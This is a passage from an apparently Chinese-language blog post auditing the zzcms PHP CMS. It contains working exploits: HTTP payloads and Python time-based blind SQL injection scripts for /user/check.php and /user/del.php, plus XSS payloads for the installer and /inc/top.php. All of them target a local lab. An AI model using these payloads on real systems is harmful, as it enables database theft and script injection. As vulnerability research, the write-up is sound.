class="string">"/inc/area.php"</span>);</span><br></pre></td></tr></table></figure><p>在conn.php文件中，可以看到又包含许多文件，其中stopsqlin.php文件很明显就是用来防止SQL注入，既然我们要寻找这个cms的漏洞，那么必然需要了解这个网站预防SQL注入的措施，所以继续跟进<strong>stopsqlin.php</strong>文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/inc/stopsqlin.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">zc_check</span><span class="params">($string)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_array($string))&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line"> <span class="keyword">return</span> htmlspecialchars(trim($string));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> addslashes(htmlspecialchars(trim($string)));</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">foreach</span>($string <span class="keyword">as</span> $k =&gt; $v) $string[$k] = zc_check($v);</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">$_POST =zc_check($_POST);</span><br><span class="line">$_GET =zc_check($_GET);</span><br><span class="line">$_COOKIE =zc_check($_COOKIE);</span><br><span class="line">@extract($_POST);</span><br><span class="line">@extract($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>zc_check</strong>函数的作用的就是检查魔术引号功能是否开启，未开启的话就利用addslashes函数对全局变量$_REQUEST的特殊符号进行转义处理，防止SQL注入，这里我们就必须知道，当某个文件包含了/inc/conn.php，那么这个文件就对所有POST，GET或者COOKIE的中的变量进行了特殊字符的转义处理。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="SQL注入漏洞1"><a href="#SQL注入漏洞1" class="headerlink" title="SQL注入漏洞1"></a>SQL注入漏洞1</h3><h4 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h4><p>/user/check.php第二十行</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#/user/check.php</span><br><span class="line">&lt;?php</span><br><span class="line">include(&quot;../inc/conn.php&quot;);</span><br><span class="line">if (!isset($_COOKIE[&quot;UserName&quot;]) || !isset($_COOKIE[&quot;PassWord&quot;]))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;location.href=&apos;/user/login.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$username=nostr($_COOKIE[&quot;UserName&quot;]);</span><br><span class="line">$rs=query(&quot;select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username=&apos;&quot;.$username.&quot;&apos; and password=&apos;&quot;.$_COOKIE[&quot;PassWord&quot;].&quot;&apos;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我们可以发现/user/check.php文件是包含了关键文件/inc/conn.php的，所以第一个查询语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"select id,usersf,lastlogintime from zzcms_user where lockuser=0 and username='"</span>.$username.<span class="string">"' and password='"</span>.$_COOKIE[<span class="string">"PassWord"</span>].<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure><p>经过单引号包裹，并且$username和$password都来自全局变量COOKIE，所以无法进行SQL注入</p><p>在第二十行的第二个查询语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query(<span class="string">"UPDATE zzcms_user SET loginip = '"</span>.getip().<span class="string">"' WHERE username='"</span>.$username.<span class="string">"'"</span>);</span><br></pre></td></tr></table></figure><p>我们可以发现拼接的参数是<strong>getip()</strong>函数的返回值，我们在Seay审计系统中对<strong>getip()</strong>函数进行全局搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#/inc/function.php</span><br><span class="line">&lt;?php</span><br><span class="line">function getip()&#123; </span><br><span class="line">if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); </span><br><span class="line">else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); </span><br><span class="line">else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) </span><br><span class="line">$ip = getenv(&quot;REMOTE_ADDR&quot;); </span><br><span class="line">else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) </span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; </span><br><span class="line">else </span><br><span class="line">$ip = &quot;unknown&quot;; </span><br><span class="line">return($ip); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以发现ip我们是可以自己构造的，所以会导致SQL注入攻击</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>事先在/reg/userreg.php页面注册账号，账号名为test，密码为test，注意这里密码是以md5加密的形式存储在数据库中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/reg/userregpost.php 第182行中注册成功后将用户信息写入zzcms_user表中</span></span><br><span class="line">query(<span class="string">"INSERT INTO zzcms_user (username,password,passwordtrue,usersf,comane,content,somane,sex,phone,email,img,totleRMB,regdate,lastlogintime)VALUES('$username','"</span>.md5($password).<span class="string">"','$password','$usersf','$comane','&amp;nbsp;','$somane','1','$phone','$email','/image/nopic.gif','"</span>.jf_reg.<span class="string">"','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"','"</span>.date(<span class="string">'Y-m-d H:i:s'</span>).<span class="string">"')"</span>);</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注册用户后，我们就可以构造<strong>PAYLOAD</strong>进行SQL注入攻击了，这里关键参数ip字段我采用的是头部的<strong>X-Forwarded-For</strong>字段，因为是这里的SQL语句是<strong>UPDATE</strong>语句，所以我采用的是基于<strong>时间</strong>的盲注，给出我的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /user/check.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947;UserName=test;PassWord=098f6bcd4621d373cade4e832627b4f6</span><br><span class="line">X-Forwarded-For: 1.1.1.1&apos; and if(ascii(substr(database(),1,1))=122,sleep(3),1)#</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>再贴上盲注的具体脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#/user/check.php</span></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/check.php"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>:<span class="string">"UserName=test;PassWord=098f6bcd4621d373cade4e832627b4f6"</span>,</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1.1.1.1' and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#"</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=headers)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"database:"</span>,database)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="SQL注入漏洞2"><a href="#SQL注入漏洞2" class="headerlink" title="SQL注入漏洞2"></a>SQL注入漏洞2</h3><h4 id="位置-1"><a href="#位置-1" class="headerlink" title="位置"></a>位置</h4><p>/user/del.php第139行</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#/user/del.php 第139行</span><br><span class="line">&lt;?php</span><br><span class="line">$sql=&quot;select id,editor from &quot;.$tablename.&quot; where id =&apos;$id&apos;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这句SQL语句不同其他处的SQL语句，是通过两个变量$tablename和$id拼接而成的，更特别的是这里的$tablename是不同于特定情况的，我们跟进变量$tablename和$id</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/del.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pagename=trim($_POST[<span class="string">"pagename"</span>]);</span><br><span class="line">$tablename=trim($_POST[<span class="string">"tablename"</span>]);</span><br><span class="line">$id=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($_POST[<span class="string">'id'</span>]);$i++)&#123;</span><br><span class="line">checkid($_POST[<span class="string">'id'</span>][$i]);</span><br><span class="line">    $id=$id.($_POST[<span class="string">'id'</span>][$i].<span class="string">','</span>);</span><br><span class="line">    &#125;</span><br><span class="line">$id=substr($id,<span class="number">0</span>,strlen($id)<span class="number">-1</span>);<span class="comment">//去除最后面的","</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($id) || $id==<span class="string">""</span>)&#123;</span><br><span class="line">showmsg(<span class="string">'操作失败！至少要选中一条信息。'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知变量$id和$tablename都是经过POST方式获得，但是$id经过checkid的消毒处理，我们无法通过该变量进行攻击，再看$tablename，之后的switch语句对$tablename的值进行判断并分别执行对应的sql语句，我们跟进到135行，便可以发现此处的$tablename的值是排除上面所有特殊值的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/del.php</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos($id,<span class="string">","</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">$sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id in ("</span>. $id .<span class="string">")"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$sql=<span class="string">"select id,editor from "</span>.$tablename.<span class="string">" where id ='$id'"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且此处的SQL语句中的变量$tablename没有经过单引号包裹，所有我们可以通过这个变量进行SQL攻击</p><h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>首先我们必须确定列id和editor是属于具体哪个表的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们随机选取一个表zzcms_answer作为例子</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /user/del.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line"></span><br><span class="line">id=1&amp;tablename=zzcms_answer union select 1,2 and if(ascii(substr(database(),1,1))=122,sleep(3),1)#</span><br></pre></td></tr></table></figure><p>因为这里采用的是基于时间的盲注，从zzcms_answer表中查询的结果有可能为空，如果为空，就不能执行后面的if语句，所以为了确保有查询结果，加入联合查询，保证有查询结果</p><p>下面附上盲注脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/user/del.php</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/del.php"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:<span class="string">"1"</span>,</span><br><span class="line">            <span class="string">"tablename"</span>:<span class="string">"zzcms_answer union select 1,2 and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#"</span>%(i,j)</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"database:"</span>,database)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="XSS漏洞1"><a href="#XSS漏洞1" class="headerlink" title="XSS漏洞1"></a>XSS漏洞1</h3><h4 id="位置-2"><a href="#位置-2" class="headerlink" title="位置"></a>位置</h4><p>/install/step_6.php 第10-11行</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/step_6.php 第10-11行</span></span><br><span class="line">管理员户名：<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $admin<span class="meta">?&gt;</span>&lt;br/&gt;</span><br><span class="line">管理员密码： <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $adminpwdtrue<span class="meta">?&gt;</span>&lt;br/&gt;</span><br></pre></td></tr></table></figure><p>可以看出变量$admin和$adminpwdtrue直接打印出来，很可能存在XSS漏洞，我们继续跟进这两个变量</p><p>我们可以从文件名看出这是安装第六步的页面，那么我们就跟进到安装的index.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php 第8,9,10行</span></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>extract函数的作用是将数组的键名变成各个变量名，键名对应键值对应变量的值，并且我们发现一个变量$step，猜测可能跟安装的步骤有关，继续跟进该变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/install/index.php 第52-124行</span></span><br><span class="line"><span class="keyword">switch</span>($step)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>:<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'6'</span>:<span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现当变量$step值为6时，就包含了step_6.php，而我们可以发现index.php的开头是没有包含之前所说的关键文件/inc/conn.php的，所以这里的POST和GET是没有经过转义处理的，所以$admin和$adminpwdtrue是可控的变量</p><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p>PAYLOAD如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /install/ HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">step=6&amp;admin=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框</p><h3 id="XSS漏洞2"><a href="#XSS漏洞2" class="headerlink" title="XSS漏洞2"></a>XSS漏洞2</h3><h4 id="位置-3"><a href="#位置-3" class="headerlink" title="位置"></a>位置</h4><p>/inc/top.php 第3-5行</p><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/inc/top.php 第3-5行</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">"action"</span>]==<span class="string">"search"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;location.href='"</span>.@$_POST[<span class="string">"lb"</span>].<span class="string">"/search.php?keyword="</span>.@$_POST[<span class="string">"keyword"</span>].<span class="string">"'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以注意到这个文件也是没有包含到关键文件/inc/conn.php，所以未对POST数据做消毒处理，这里就可以利用闭合标签的方式进行XSS攻击</p><h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><p>PAYLOAD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /inc/top.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/inc/top.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=adad7183ca248a9be539f0a153ce72f8; bdshare_firstime=1551059496947</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">action=search&amp;lb=&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zzcms/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹框</p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="位置-4"><a href="#位置-4" class="headerlink" title="位置"></a>位置</h4><p>/uploadimg_form.php 文件提供了文件上传的功能</p><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/uploading_form.php 第61-68行</span><br><span class="line">&lt;form action=&quot;uploadimg.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onSubmit=&quot;return mysub()&quot; style=&quot;padding:10px&quot; target=&quot;doaction&quot;&gt;</span><br><span class="line">&lt;div id=&quot;esave&quot; style=&quot;position:absolute; top:0px; left:0px; z-index:10; visibility:hidden; width: 100%; height: 77px; background-color: #FFFFFF; layer-background-color: #FFFFFF; border: 1px none #000000;&quot;&gt; </span><br><span class="line">&lt;div align=&quot;center&quot;&gt;&lt;br /&gt;&lt;img src=&quot;image/loading.gif&quot; width=&quot;24&quot; height=&quot;24&quot; /&gt;正在上传中...请稍候！&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;g_fu_image[]&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;noshuiyin&quot; type=&quot;hidden&quot; id=&quot;noshuiyin&quot; value=&quot;&lt;?php echo @$_GET[&apos;noshuiyin&apos;]?&gt;&quot; /&gt;</span><br><span class="line">&lt;input name=&quot;imgid&quot; type=&quot;hidden&quot; id=&quot;imgid&quot; value=&quot;&lt;?php echo @$_GET[&apos;imgid&apos;]?&gt;&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>通过表单内容我们可以看出，文件上传的位置是uploadimg.php文件，所以我们跟进该文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/uploadimg.php 第26-43行</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//是否存在文件</span></span><br><span class="line"><span class="keyword">if</span> (!is_uploaded_file(@<span class="keyword">$this</span>-&gt;fileName[tmp_name]))&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp');parent.window.close();&lt;/script&gt;"</span>; <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查文件大小</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;max_file_size*<span class="number">1024</span> &lt; <span class="keyword">$this</span>-&gt;fileName[<span class="string">"size"</span>])&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span 